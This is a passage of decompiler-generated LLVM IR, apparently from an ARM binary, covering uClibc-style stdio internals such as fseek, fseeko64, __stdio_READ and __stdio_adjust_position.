  %v2_1b6b0 = inttoptr i32 %v1_1b6b0 to i16*
  %v3_1b6b0 = load i16, i16* %v2_1b6b0, align 2
  %v4_1b6b0 = zext i16 %v3_1b6b0 to i32
  %v1_1b6b4 = add nsw i32 %v4_1b6b0, -19
  store i32 %v1_1b6b4, i32* @r2, align 4
  %v0_1b6b8 = call i32 @memcpy()
  %v0_1b6bc = load i32, i32* @r7, align 4
  %v1_1b6bc = add i32 %v0_1b6bc, 16
  %v2_1b6bc = inttoptr i32 %v1_1b6bc to i16*
  %v3_1b6bc = load i16, i16* %v2_1b6bc, align 2
  %v4_1b6bc = zext i16 %v3_1b6bc to i32
  %v0_1b6c0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1b6c0, i32* @r5, align 4
  %v2_1b6c4 = add i32 %v4_1b6bc, %v0_1b6bc
  store i32 %v2_1b6c4, i32* @r7, align 4
  br label %dec_label_pc_1b6c8

dec_label_pc_1b6c8:                               ; preds = %dec_label_pc_1b614, %dec_label_pc_1b684
  %v0_1b690 = phi i32 [ %tmp, %dec_label_pc_1b614 ], [ %v0_1b6c0, %dec_label_pc_1b684 ]
  %v0_1b688 = phi i32 [ %v1_1b5c8, %dec_label_pc_1b614 ], [ %v2_1b6c4, %dec_label_pc_1b684 ]
  %v3_1b6cc = icmp ult i32 %v0_1b688, %v2_1b614
  %v1_1b6d0 = add i32 %v0_1b690, 19
  store i32 %v1_1b6d0, i32* @r0, align 4
  %v1_1b6d4 = add i32 %v0_1b688, 19
  store i32 %v1_1b6d4, i32* @r1, align 4
  br i1 %v3_1b6cc, label %dec_label_pc_1b634, label %dec_label_pc_1b6dc.loopexit

dec_label_pc_1b6dc.loopexit:                      ; preds = %dec_label_pc_1b6c8
  %v0_1b6dc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1b6dc

dec_label_pc_1b6dc:                               ; preds = %dec_label_pc_1b6dc.loopexit, %dec_label_pc_1b650
  %v1_1b6dc = phi i32 [ %v0_1b690, %dec_label_pc_1b6dc.loopexit ], [ %v0_1b668, %dec_label_pc_1b650 ]
  %v0_1b6dc = phi i32 [ %v0_1b6dc.pre, %dec_label_pc_1b6dc.loopexit ], [ %v1_1b668, %dec_label_pc_1b650 ]
  %v2_1b6dc = sub i32 %v1_1b6dc, %v0_1b6dc
  store i32 %v2_1b6dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b6e0

dec_label_pc_1b6e0:                               ; preds = %dec_label_pc_1b670, %dec_label_pc_1b60c, %dec_label_pc_1b6dc
  %v0_1b6e0 = phi i32 [ %v0_1b6e0.pre, %dec_label_pc_1b670 ], [ %v0_1b60c, %dec_label_pc_1b60c ], [ %v2_1b6dc, %dec_label_pc_1b6dc ]
  store i32 %v3_1b5b0, i32* %r4.global-to-local, align 4
  store i32 %v6_1b5b0, i32* @r5, align 4
  store i32 %v12_1b5b0, i32* @r7, align 4
  ret i32 %v0_1b6e0

; uselistorder directives
  uselistorder i32 %v0_1b688, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1b690, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1b5c8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3, 4 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 8, 9, 19, 0, 10, 11, 12, 13, 14, 15, 16, 17, 1, 2, 3, 4, 5, 6, 18, 7 }
  uselistorder i32 14, { 4, 9, 11, 5, 8, 6, 1, 2, 3, 7, 0, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1b6e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b6c8, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1b6fc = load i32, i32* @r1, align 4
  store i32 %v0_1b6fc, i32* @r2, align 4
  %v0_1b704 = call i32 @__GI_fseeko64()
  ret i32 %v0_1b704
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_1b714 = load i32, i32* @r4, align 4
  %v6_1b714 = load i32, i32* @r5, align 4
  %v12_1b714 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_1b728 = load i32, i32* @r2, align 4
  store i32 %v0_1b728, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r6.global-to-local, align 4
  %v0_1b734 = load i32, i32* @r0, align 4
  store i32 %v0_1b734, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_1b750, label %dec_label_pc_1b73c

dec_label_pc_1b73c:                               ; preds = %entry
  %v0_1b73c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1b748 = inttoptr i32 %v0_1b73c to i32*
  store i32 22, i32* %v2_1b748, align 4
  br label %dec_label_pc_1b840

dec_label_pc_1b750:                               ; preds = %entry
  %v1_1b750 = add i32 %v0_1b734, 52
  %v2_1b750 = inttoptr i32 %v1_1b750 to i32*
  %v3_1b750 = load i32, i32* %v2_1b750, align 4
  %v1_1b754 = sub i32 1, %v3_1b750
  store i32 %v1_1b754, i32* %r8.global-to-local, align 4
  %v2_1b754 = icmp ult i32 %v3_1b750, 2
  br i1 %v2_1b754, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1b750
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1b79c

bb:                                               ; preds = %dec_label_pc_1b750
  %v2_1b75c = icmp eq i32 %v1_1b754, 0
  br i1 %v2_1b75c, label %dec_label_pc_1b79c, label %dec_label_pc_1b764

dec_label_pc_1b764:                               ; preds = %bb
  %v1_1b768 = add i32 %v0_1b734, 56
  store i32 %v1_1b768, i32* @r4, align 4
  %v4_1b76c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 36) to i32*), align 4
  store i32 %v4_1b76c, i32* %r1.global-to-local, align 4
  store i32 %v1_1b768, i32* %r2.global-to-local, align 4
  %v4_1b77c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1b77c)
  %v0_1b790 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b790 = add i32 %v0_1b790, 16
  %v3_1b790 = inttoptr i32 %v2_1b790 to i32*
  %v4_1b790 = load i32, i32* %v3_1b790, align 4
  store i32 %v4_1b790, i32* @ip, align 4
  store i32 112540, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b790)
  %v0_1b79c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b79c

dec_label_pc_1b79c:                               ; preds = %.thread, %bb, %dec_label_pc_1b764
  %v0_1b7a8 = phi i32 [ %v0_1b734, %.thread ], [ %v0_1b734, %bb ], [ %v0_1b79c.pre, %dec_label_pc_1b764 ]
  %v1_1b79c = inttoptr i32 %v0_1b7a8 to i16*
  %v2_1b79c = load i16, i16* %v1_1b79c, align 2
  %v1_1b7a0 = and i16 %v2_1b79c, 64
  %v2_1b7a0 = icmp eq i16 %v1_1b7a0, 0
  br i1 %v2_1b7a0, label %dec_label_pc_1b7b8, label %dec_label_pc_1b7a8

dec_label_pc_1b7a8:                               ; preds = %dec_label_pc_1b79c
  store i32 %v0_1b7a8, i32* @r0, align 4
  %v0_1b7ac = call i32 @__stdio_wcommit()
  %v2_1b7b0 = icmp eq i32 %v0_1b7ac, 0
  br i1 %v2_1b7b0, label %dec_label_pc_1b7b8, label %dec_label_pc_1b820

dec_label_pc_1b7b8:                               ; preds = %dec_label_pc_1b7a8, %dec_label_pc_1b79c
  %v0_1b7b8 = load i32, i32* @r7, align 4
  %v7_1b7b8 = icmp eq i32 %v0_1b7b8, 1
  br i1 %v7_1b7b8, label %dec_label_pc_1b7c0, label %dec_label_pc_1b7b8.dec_label_pc_1b7d4_crit_edge

dec_label_pc_1b7b8.dec_label_pc_1b7d4_crit_edge:  ; preds = %dec_label_pc_1b7b8
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1b7d4

dec_label_pc_1b7c0:                               ; preds = %dec_label_pc_1b7b8
  %v0_1b7c0 = load i32, i32* @r5, align 4
  %v2_1b7c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1b7c4, i32* %r1.global-to-local, align 4
  %v2_1b7c8 = inttoptr i32 %v0_1b7c0 to i16*
  %v3_1b7c8 = call i32 @__stdio_adjust_position(i16* %v2_1b7c8, i32 %v2_1b7c4)
  %v1_1b7cc = icmp slt i32 %v3_1b7c8, 0
  br i1 %v1_1b7cc, label %dec_label_pc_1b820, label %dec_label_pc_1b7c0.dec_label_pc_1b7d4_crit_edge

dec_label_pc_1b7c0.dec_label_pc_1b7d4_crit_edge:  ; preds = %dec_label_pc_1b7c0
  %v0_1b7d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b7d4

dec_label_pc_1b7d4:                               ; preds = %dec_label_pc_1b7b8.dec_label_pc_1b7d4_crit_edge, %dec_label_pc_1b7c0.dec_label_pc_1b7d4_crit_edge
  %v2_1b7dc.pre-phi = phi i32 [ %.pre, %dec_label_pc_1b7b8.dec_label_pc_1b7d4_crit_edge ], [ %v2_1b7c4, %dec_label_pc_1b7c0.dec_label_pc_1b7d4_crit_edge ]
  %v0_1b7d4 = phi i32 [ %v0_1b7b8, %dec_label_pc_1b7b8.dec_label_pc_1b7d4_crit_edge ], [ %v0_1b7d4.pre, %dec_label_pc_1b7c0.dec_label_pc_1b7d4_crit_edge ]
  store i32 %v0_1b7d4, i32* %r2.global-to-local, align 4
  %v0_1b7d8 = load i32, i32* @r5, align 4
  store i32 %v2_1b7dc.pre-phi, i32* %r1.global-to-local, align 4
  %v4_1b7e0 = call i32 @__stdio_seek(i32 %v0_1b7d8, i32* nonnull %stack_var_-32, i32 %v0_1b7d4)
  %v1_1b7e4 = icmp slt i32 %v4_1b7e0, 0
  br i1 %v1_1b7e4, label %dec_label_pc_1b820, label %dec_label_pc_1b7ec

dec_label_pc_1b7ec:                               ; preds = %dec_label_pc_1b7d4
  %v0_1b7ec = load i32, i32* @r5, align 4
  %v1_1b7ec = inttoptr i32 %v0_1b7ec to i16*
  %v2_1b7ec = load i16, i16* %v1_1b7ec, align 2
  %v1_1b7f0 = add i32 %v0_1b7ec, 8
  %v2_1b7f0 = inttoptr i32 %v1_1b7f0 to i32*
  %v3_1b7f0 = load i32, i32* %v2_1b7f0, align 4
  store i32 %v3_1b7f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1b7f8 = and i16 %v2_1b7ec, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_1b7f8, i16* %v1_1b7ec, align 2
  %v0_1b804 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b804 = load i32, i32* @r5, align 4
  %v2_1b804 = add i32 %v1_1b804, 28
  %v3_1b804 = inttoptr i32 %v2_1b804 to i32*
  store i32 %v0_1b804, i32* %v3_1b804, align 4
  %v0_1b808 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b808 = trunc i32 %v0_1b808 to i8
  %v2_1b808 = load i32, i32* @r5, align 4
  %v3_1b808 = add i32 %v2_1b808, 2
  %v4_1b808 = inttoptr i32 %v3_1b808 to i8*
  store i8 %v1_1b808, i8* %v4_1b808, align 1
  %v0_1b80c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b80c = load i32, i32* @r5, align 4
  %v2_1b80c = add i32 %v1_1b80c, 16
  %v3_1b80c = inttoptr i32 %v2_1b80c to i32*
  store i32 %v0_1b80c, i32* %v3_1b80c, align 4
  %v0_1b810 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b810 = load i32, i32* @r5, align 4
  %v2_1b810 = add i32 %v1_1b810, 20
  %v3_1b810 = inttoptr i32 %v2_1b810 to i32*
  store i32 %v0_1b810, i32* %v3_1b810, align 4
  %v0_1b814 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b814 = load i32, i32* @r5, align 4
  %v2_1b814 = add i32 %v1_1b814, 24
  %v3_1b814 = inttoptr i32 %v2_1b814 to i32*
  store i32 %v0_1b814, i32* %v3_1b814, align 4
  %v0_1b818 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b818 = load i32, i32* @r5, align 4
  %v2_1b818 = add i32 %v1_1b818, 44
  %v3_1b818 = inttoptr i32 %v2_1b818 to i32*
  store i32 %v0_1b818, i32* %v3_1b818, align 4
  br label %dec_label_pc_1b824

dec_label_pc_1b820:                               ; preds = %dec_label_pc_1b7a8, %dec_label_pc_1b7d4, %dec_label_pc_1b7c0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b824

dec_label_pc_1b824:                               ; preds = %dec_label_pc_1b7ec, %dec_label_pc_1b820
  %v0_1b824 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b824 = icmp eq i32 %v0_1b824, 0
  br i1 %v2_1b824, label %dec_label_pc_1b824..thread8_crit_edge, label %bb20

dec_label_pc_1b824..thread8_crit_edge:            ; preds = %dec_label_pc_1b824
  %v0_1b83c.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_1b824
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1b834 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b834 = add i32 %v1_1b834, 24
  %v4_1b834 = inttoptr i32 %v3_1b834 to i32*
  %v5_1b834 = load i32, i32* %v4_1b834, align 4
  store i32 %v5_1b834, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1b824..thread8_crit_edge, %bb20
  %v0_1b83c = phi i32 [ %v0_1b83c.pre, %dec_label_pc_1b824..thread8_crit_edge ], [ %v5_1b834, %bb20 ]
  %v2_1b83c = xor i1 %v2_1b824, true
  call void @__pseudo_cond_branch(i1 %v2_1b83c, i32 %v0_1b83c)
  br label %dec_label_pc_1b840

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b73c, %.thread8
  %v0_1b840 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1b714, i32* @r4, align 4
  store i32 %v6_1b714, i32* @r5, align 4
  store i32 %v12_1b714, i32* @r7, align 4
  ret i32 %v0_1b840

; uselistorder directives
  uselistorder i32 %v0_1b7d4, { 1, 0 }
  uselistorder i32 %v3_1b750, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 56, { 13, 15, 6, 7, 8, 9, 14, 5, 1, 0, 3, 16, 11, 17, 12, 10, 2, 18, 19, 4 }
  uselistorder label %dec_label_pc_1b840, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1b824, { 1, 0 }
  uselistorder label %dec_label_pc_1b820, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1b7d4, { 1, 0 }
  uselistorder label %dec_label_pc_1b79c, { 2, 1, 0 }
}

define i32 @function_1b854(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b854:
  %v0_1b854 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b854, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1b854
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1b854, %bb
  %v10_1b860 = phi i32 [ %arg1, %dec_label_pc_1b854 ], [ 0, %bb ]
  ret i32 %v10_1b860

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b864 = load i32, i32* @r4, align 4
  store i32 %v3_1b864, i32* %stack_var_-12, align 4
  %v0_1b868 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b868 = inttoptr i32 %v0_1b868 to i16*
  %v2_1b868 = load i16, i16* %v1_1b868, align 2
  %v3_1b868 = zext i16 %v2_1b868 to i32
  %v1_1b86c = and i32 %v3_1b868, 4
  store i32 %v1_1b86c, i32* %r5.global-to-local, align 4
  %v2_1b86c = icmp eq i32 %v1_1b86c, 0
  store i32 %v0_1b868, i32* %r4.global-to-local, align 4
  br i1 %v2_1b86c, label %dec_label_pc_1b880, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1b880:                               ; preds = %entry
  %v1_1b880 = icmp slt i32 %arg2, 0
  br i1 %v1_1b880, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1b880
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1b880, %bb18
  %v1_1b888 = add i32 %v0_1b868, 4
  %v2_1b888 = inttoptr i32 %v1_1b888 to i32*
  %v3_1b888 = load i32, i32* %v2_1b888, align 4
  store i32 %v3_1b888, i32* %r0.global-to-local, align 4
  %v1_1b88c = call i32 @__GI_read(i32 %v3_1b888)
  store i32 %v1_1b88c, i32* %r0.global-to-local, align 4
  %v5_1b894 = icmp sgt i32 %v1_1b88c, 0
  br i1 %v5_1b894, label %.thread7, label %dec_label_pc_1b898

dec_label_pc_1b898:                               ; preds = %bb19
  %v2_1b890 = icmp eq i32 %v1_1b88c, 0
  %v0_1b898 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b898 = inttoptr i32 %v0_1b898 to i16*
  %v2_1b898 = load i16, i16* %v1_1b898, align 2
  br i1 %v2_1b890, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1b898
  %v2_1b89c = or i16 %v2_1b898, 4
  store i16 %v2_1b89c, i16* %v1_1b898, align 2
  %v1_1b8b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1b898
  %v2_1b8a0 = or i16 %v2_1b898, 8
  store i16 %v2_1b8a0, i16* %v1_1b898, align 2
  %v1_1b8ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1b8ac, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1b8b8 = phi i32 [ %v1_1b8b8.pre, %bb20 ], [ 0, %bb ], [ %v1_1b88c, %bb19 ], [ %v1_1b8ac, %bb21 ]
  %v2_1b8b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b8b4, i32* @r4, align 4
  ret i32 %v1_1b8b8

; uselistorder directives
  uselistorder i16 %v2_1b898, { 1, 0 }
  uselistorder i32 %v1_1b88c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 2, 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b8bc = load i32, i32* @r4, align 4
  store i32 %v3_1b8bc, i32* %stack_var_-12, align 4
  %v3_1b8c0 = load i16, i16* %arg1, align 2
  %v4_1b8c0 = zext i16 %v3_1b8c0 to i32
  store i32 %v4_1b8c0, i32* @ip, align 4
  %tmp17 = urem i16 %v3_1b8c0, 4
  %v1_1b8c4 = zext i16 %tmp17 to i32
  store i32 %v1_1b8c4, i32* %r2.global-to-local, align 4
  %v2_1b8c4 = icmp eq i16 %tmp17, 0
  br i1 %v2_1b8c4, label %bb, label %dec_label_pc_1b8d8

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_1b8d8:                               ; preds = %entry
  %v1_1b8d8 = add nsw i32 %v1_1b8c4, -1
  %v7_1b8d8 = icmp eq i16 %tmp17, 1
  br i1 %v7_1b8d8, label %bb14, label %dec_label_pc_1b8e0

dec_label_pc_1b8e0:                               ; preds = %dec_label_pc_1b8d8
  %v1_1b8e0 = and i32 %v4_1b8c0, 2048
  %v2_1b8e0 = icmp eq i32 %v1_1b8e0, 0
  br i1 %v2_1b8e0, label %bb14, label %dec_label_pc_1b8e8

dec_label_pc_1b8e8:                               ; preds = %dec_label_pc_1b8e0
  %v7_1b8e8 = icmp eq i32 %v1_1b8d8, 2
  br i1 %v7_1b8e8, label %dec_label_pc_1b96c, label %dec_label_pc_1b8f0

dec_label_pc_1b8f0:                               ; preds = %dec_label_pc_1b8e8
  %v2_1b8f0 = add i32 %tmp, 40
  %v3_1b8f0 = inttoptr i32 %v2_1b8f0 to i32*
  %v4_1b8f0 = load i32, i32* %v3_1b8f0, align 4
  store i32 %v4_1b8f0, i32* %r3.global-to-local, align 4
  %v2_1b8f4 = icmp eq i32 %v4_1b8f0, 0
  br i1 %v2_1b8f4, label %dec_label_pc_1b8fc, label %dec_label_pc_1b96c

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b8f0
  %v2_1b8fc = add i32 %tmp, 44
  %v3_1b8fc = inttoptr i32 %v2_1b8fc to i32*
  %v4_1b8fc = load i32, i32* %v3_1b8fc, align 4
  store i32 %v4_1b8fc, i32* %r3.global-to-local, align 4
  %v2_1b900 = add i32 %tmp, 3
  %v3_1b900 = inttoptr i32 %v2_1b900 to i8*
  %v4_1b900 = load i8, i8* %v3_1b900, align 1
  %v5_1b900 = zext i8 %v4_1b900 to i32
  store i32 %v5_1b900, i32* %r2.global-to-local, align 4
  %v2_1b904 = icmp eq i32 %v4_1b8fc, 0
  br i1 %v2_1b904, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1b8fc
  %v1_1b90c3 = sub nsw i32 0, %v5_1b900
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1b8fc
  %v3_1b908 = add i32 %tmp, 2
  %v4_1b908 = inttoptr i32 %v3_1b908 to i8*
  %v5_1b908 = load i8, i8* %v4_1b908, align 1
  %v6_1b908 = zext i8 %v5_1b908 to i32
  store i32 %v6_1b908, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1b908, %v5_1b900
  %v3_1b910 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_1b8e0, %dec_label_pc_1b8d8, %bb13
  %v1_1b924 = phi i32 [ %v1_1b90c3, %.thread1 ], [ %v1_1b8d8, %dec_label_pc_1b8e0 ], [ %v1_1b8d8, %dec_label_pc_1b8d8 ], [ 0, %bb ], [ %v3_1b910, %bb13 ]
  %v1_1b914 = and i32 %v4_1b8c0, 64
  %v2_1b914 = icmp eq i32 %v1_1b914, 0
  %v2_1b918 = add i32 %tmp, 16
  %v3_1b918 = inttoptr i32 %v2_1b918 to i32*
  %v4_1b918 = load i32, i32* %v3_1b918, align 4
  store i32 %v4_1b918, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1b914, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1b924 = sub i32 %v1_1b924, %v4_1b918
  store i32 %v2_1b924, i32* %r3.global-to-local, align 4
  %v1_1b928 = inttoptr i32 %arg2 to i32*
  %v2_1b928 = load i32, i32* %v1_1b928, align 4
  store i32 %v2_1b928, i32* %r0.global-to-local, align 4
  %v3_1b928 = add i32 %arg2, 4
  %v4_1b928 = inttoptr i32 %v3_1b928 to i32*
  %v5_1b928 = load i32, i32* %v4_1b928, align 4
  %v2_1b92c = add i32 %storemerge, %v2_1b924
  store i32 %v2_1b92c, i32* %r4.global-to-local, align 4
  %v2_1b930 = sub i32 %v2_1b928, %v2_1b92c
  store i32 %v2_1b930, i32* %r2.global-to-local, align 4
  %v2_1b934 = and i32 %v2_1b92c, 1073741824
  %v3_1b934 = icmp ne i32 %v2_1b934, 0
  %v4_1b934 = ashr i32 %v2_1b92c, 31
  %v6_1b934 = icmp eq i1 %v3_1b934, false
  %v7_1b934 = sub i32 %v5_1b928, %v4_1b934
  %v9_1b934 = sext i1 %v6_1b934 to i32
  %v10_1b934 = add i32 %v7_1b934, %v9_1b934
  store i32 %v10_1b934, i32* %r3.global-to-local, align 4
  %v2_1b938 = sub i32 %v10_1b934, %v5_1b928
  %v4_1b938 = xor i32 %v10_1b934, %v5_1b928
  %v5_1b938 = xor i32 %v2_1b938, %v10_1b934
  %v6_1b938 = and i32 %v5_1b938, %v4_1b938
  %v7_1b938 = icmp slt i32 %v6_1b938, 0
  %v8_1b938 = icmp slt i32 %v2_1b938, 0
  %v9_1b938 = icmp eq i32 %v10_1b934, %v5_1b928
  store i32 %v2_1b930, i32* %v1_1b928, align 4
  %v5_1b93c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1b93c, i32* %v4_1b928, align 4
  %v3_1b940 = xor i1 %v8_1b938, %v7_1b938
  %v4_1b940 = or i1 %v9_1b938, %v3_1b940
  br i1 %v4_1b940, label %dec_label_pc_1b944, label %dec_label_pc_1b950

dec_label_pc_1b944:                               ; preds = %bb14
  br i1 %v9_1b938, label %dec_label_pc_1b948, label %dec_label_pc_1b954thread-pre-split

dec_label_pc_1b948:                               ; preds = %dec_label_pc_1b944
  %v0_1b948 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b948 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_1b948, %v1_1b948
  br i1 %tmp18, label %dec_label_pc_1b950, label %dec_label_pc_1b954thread-pre-split

dec_label_pc_1b950:                               ; preds = %dec_label_pc_1b948, %bb14
  %v0_1b950 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b950 = sub i32 0, %v0_1b950
  store i32 %v1_1b950, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b954

dec_label_pc_1b954thread-pre-split:               ; preds = %dec_label_pc_1b948, %dec_label_pc_1b944
  %v0_1b954.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b954

dec_label_pc_1b954:                               ; preds = %dec_label_pc_1b954thread-pre-split, %dec_label_pc_1b950
  %v0_1b954 = phi i32 [ %v0_1b954.pr, %dec_label_pc_1b954thread-pre-split ], [ %v1_1b950, %dec_label_pc_1b950 ]
  %v1_1b954 = icmp slt i32 %v0_1b954, 0
  br i1 %v1_1b954, label %dec_label_pc_1b95c, label %dec_label_pc_1b970

dec_label_pc_1b95c:                               ; preds = %dec_label_pc_1b954
  %v0_1b95c = call i32 @__GI___errno_location()
  store i32 %v0_1b95c, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1b964 = inttoptr i32 %v0_1b95c to i32*
  store i32 75, i32* %v2_1b964, align 4
  %v0_1b970.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b970

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b8f0, %dec_label_pc_1b8e8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b970

dec_label_pc_1b970:                               ; preds = %dec_label_pc_1b954, %dec_label_pc_1b95c, %dec_label_pc_1b96c
  %v0_1b970 = phi i32 [ %v0_1b954, %dec_label_pc_1b954 ], [ %v0_1b970.pre, %dec_label_pc_1b95c ], [ -1, %dec_label_pc_1b96c ]
  store i32 %v0_1b970, i32* %r0.global-to-local, align 4
  %v2_1b978 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b978, i32* @r4, align 4
  ret i32 %v0_1b970

; uselistorder directives
  uselistorder i32 %v0_1b970, { 1, 0 }
  uselistorder i1 %v9_1b938, { 1, 0 }
  uselistorder i32 %v2_1b938, { 1, 0 }
  uselistorder i32 %v10_1b934, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1b928, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1b970, { 2, 1, 0 }
